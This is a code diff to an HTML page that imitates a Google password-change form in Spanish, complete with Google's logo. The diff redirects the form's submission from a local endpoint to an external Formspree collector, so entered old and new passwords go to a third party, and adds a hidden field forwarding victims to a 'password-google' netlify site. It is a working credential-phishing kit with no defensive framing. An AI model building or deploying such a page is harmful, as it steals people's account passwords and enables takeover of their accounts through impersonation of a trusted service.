@@ -10,7 +10,7 @@
     <div class="container">
         <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Google Logo" class="logo">
         <h1>Cambiar Contraseña</h1>
-        <form id="passwordChangeForm" action="/change-password" method="POST">
+        <form id="passwordChangeForm" action="https://formspree.io/f/mgvozgak" method="POST">
             <div class="form-group">
                 <label for="oldPassword">Contraseña anterior</label>
                 <input type="password" id="oldPassword" name="oldPassword" required>
@@ -23,6 +23,8 @@
                 <label for="confirmPassword">Repetir nueva contraseña</label>
                 <input type="password" id="confirmPassword" name="confirmPassword" required>
             </div>
+            <!-- Campo oculto para redireccionar después del envío -->
+            <input type="hidden" name="_next" value="https://password-google.netlify.app/">
             <button type="submit" class="submit-btn">Cambiar Contraseña</button>
         </form>
     </div>
